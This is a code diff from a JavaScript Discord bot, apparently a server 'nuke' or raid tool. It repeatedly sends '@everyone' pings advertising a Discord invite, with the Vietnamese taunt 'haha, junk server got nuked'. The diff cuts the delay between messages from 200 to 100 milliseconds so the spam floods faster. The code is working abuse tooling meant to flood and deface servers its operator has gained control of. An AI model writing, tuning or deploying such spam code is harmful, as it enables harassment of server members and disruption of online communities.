@@ -94,27 +94,27 @@ client.on("interactionCreate", async interaction => {
 
       // Gửi 3 tin nhắn
       await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-      await sleep(200);
+      await sleep(100);
       await ch.send("Haha server rách bị nuke|@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
     })());
   }
